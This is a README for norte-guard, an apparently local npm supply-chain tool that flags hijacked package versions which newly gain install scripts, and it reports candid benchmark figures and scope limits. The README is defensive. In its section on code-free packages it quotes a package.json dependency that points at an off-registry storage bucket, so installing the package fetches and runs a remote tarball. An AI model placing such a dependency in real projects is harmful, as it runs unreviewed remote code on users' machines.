# norte-guard

**The npm quarantine copilot.**

npm 12, pnpm 11 and Dependabot now block packages published in the last 24-72
hours by default. That is the right defence. But when you need a hotfix inside
the window, someone will run `--min-release-age 0`, and the question changes to:
**is this specific version safe?**

Package managers do not answer that. norte-guard does.

```bash
npx norte-guard inspect keyv@6.0.0
```

No account, no telemetry, no cloud. One runtime dependency: `acorn`, pinned to an
exact version with its integrity hash, and itself dependency-free. A tool whose
subject is npm supply-chain risk cannot answer "what do you install?" with a list.

## Scope

norte-guard covers **the attack that arrives on its own**: a package you already
depend on, hijacked. You made no decision; the compromised version ships to you
on the next install. This is Shai-Hulud and ChainDrop. `keyv@6.0.0` had 48 clean
releases and then gained a preinstall script, and everyone on `^5` was one
`npm install` away from it.

It does **not** cover a new malicious package you have to add yourself, and no
amount of calibration will change that. The tool compares a package against its
own history, and a name seventeen seconds old has none. That class is
typosquatting and dependency confusion: a different problem needing a different
tool. Full statement, with the two cases it failed on and their scores, in
[docs/scope.md](docs/scope.md).

### A package with no code in it

There is a third class, and it defeats every content-based analysis including
this one. Stated here rather than in a footnote because the corpus contains a
worked example.

Eight packages published in August 2026 were, in full, 35 bytes:

```js
'use strict';
module.exports = {};
```

No install script. Nothing to reach, nothing to hide, nothing obfuscated — and
the tool is right about all of that. The payload was one line of `package.json`:

```json
"dependencies": { "ltidisafe": "https://<bucket>.storage.googleapis.com/…/ltidisafe-3.7.4.tgz" }
```

`npm install` fetches that tarball and runs it. Every question this tool asks
about contents — what does it reach, what can it do, how much of it can be read —
returns "this package does nothing", correctly.

**And npm's own remediation does not reach it either.** The registry removed all
eight packages; the bucket was unaffected. A takedown reaches what the registry
hosts, and an off-registry dependency is hosted somewhere else.

This class is **PhantomRaven**, published by Koi Security in October 2025 as
*Remote Dynamic Dependencies*, and Socket already ships an `HTTP Dependency`
alert for the shape. It is described here because it bounds what this tool can
do, not because it is new — see [docs/prior-art.md](docs/prior-art.md), which
classifies every piece of this work as replication, extension, or not-found, and
exists because the mechanism above was nearly written up as a discovery.

What is measurable without reading any content is that the specifier is not a
registry range at all. Over 25,394 publications covering 13,344 distinct names,
42 names (0.315%) declare one, across five destinations — `file:` links,
`github:` shorthand, a vendor that distributes off-registry deliberately, and one
bucket.

## Install

```bash
npm install -g norte-guard      # or npx norte-guard
```

Requires Node 20+.

## Use

```bash
norte-guard inspect <pkg>[@version]   # analyse one package
norte-guard approve                   # classify packages with install scripts
norte-guard bench                     # run the public benchmark
norte-guard --help                    # everything else
```

Exit codes: `1` on BLOCK, `2` on tool error, `0` otherwise.
`INSUFFICIENT_HISTORY` exits 0 — lack of context is not evidence of risk. Use
`--strict-new-packages` to treat it as a failure.

Full reference: [docs/commands.md](docs/commands.md).

## Numbers

Measured 2026-08-16, engine v1.2.0, over a stratified sample of 500 packages
drawn from the registry by weekly downloads.

| | rate | 95% Wilson CI |
|---|---|---|
| non-PASS in gate mode (BLOCK + WARN) | 0.60% | 0.20%-1.75% |
| BLOCK, the only verdict that fails a build | 0.00% | 0.00%-0.76% |
| unevaluated (`INSUFFICIENT_HISTORY`, exit 0) | 23.00% | 19.53%-26.89% |

The previous figure here, 0.20% non-PASS, was measured on v0.3.2 and stayed after
the engine moved on. `bench` now refuses to print a saved rate without declaring
how far the run is from the engine quoting it.

**This sample says nothing about the fabricated-profile rule.** It is ranked by
weekly downloads, and that rule fires only on a name under seven days old with
zero of them: 0 of the 500 packages met either condition, so its 0% here bounds
nothing. Measuring it needs a sample of legitimate brand-new packages.

**Recall is 0 of 8**, and the reason is not that the detector looked and failed.
The fabricated-profile rule is opt-in and was off for the run, so every sample of
its class counts as a miss. Switching it on would not raise the number either:
the snapshots were taken before the collector recorded the weekly download count,
npm serves one complete week at a time, and that week has closed — so the rule
declines to judge them.

**Field recall** is reported as two numbers that must never be merged, over
packages npm removed after this collector had already scored them:

| | |
|---|---|
| packages removed by npm | 241 |
| observed before removal | 12 (4.98%, CI 2.87%-8.50%) |
| with a score recorded at publication | 9 |
| blocked at the time, by the engine running that day | **0 of 9** |
| blocked now, by the engine in this build | **not calculable**: 7 unjudgeable, 2 with no snapshot |

The first number grades a decision that was made; the second grades this build.
Reporting only the first read as a verdict on the shipped engine, and it was a
verdict on a log format — the collector records one audit verdict per
publication and never passes a download count into the scorer, so no rule that
needs one could ever appear in it.

**Precision of the capture filter**, which is what fills the corpus and is not
the rule that fails builds:

| | |
|---|---|
| packages marked | 1,509 (in 2,329 captures) |
| removed by npm | 8 |
| precision | 0.53% (CI 0.27%-1.04%) |
| oldest marked | 3.2 days |

No marked package has reached the 30 days at which a false positive is defined,
so that 0.53% counts every hit and almost no miss: it is an upper bound. Of the
19 marked packages the tracker has queried, 4 are alive with ≥10 weekly
downloads. Method and caveats: [docs/benchmark.md](docs/benchmark.md).

## How it works

The signal is not "has an install script", it is **"gained an install script it
never had"**:

```
capabilities(v_n) \ capabilities(v_n-1) = the signal
```

A package with an install script across 48 releases does not trigger. One that
gains it does. A package with fewer than 10 versions or less than 90 days of
history has no baseline, so the gate returns `INSUFFICIENT_HISTORY` rather than
a false `PASS`.

The genome is a deterministic function of public data: anyone can recompute it
and get the same answer. We do not ask for trust, we try to make it unnecessary.

Details: [docs/methodology.md](docs/methodology.md). The capability run and
the review that corrected it: [docs/audit-a5.md](docs/audit-a5.md).

## Why not Socket, Aikido or Snyk

They are cloud services that need an account and see your lockfile, or CVE
databases that cannot see a zero-day. norte-guard runs locally, on one pinned
dependency.

And one thing none of them prints: **what it does not cover.** A tool that
claims everything is a tool you cannot calibrate against, because there is
nothing it would admit to missing.

## Security

norte-guard is a supply-chain tool, so it is also a target. Threat model,
capture handling and the self-verification plan: [SECURITY.md](SECURITY.md).

MIT License - Norte Software <hola@nortesoftware.dev>
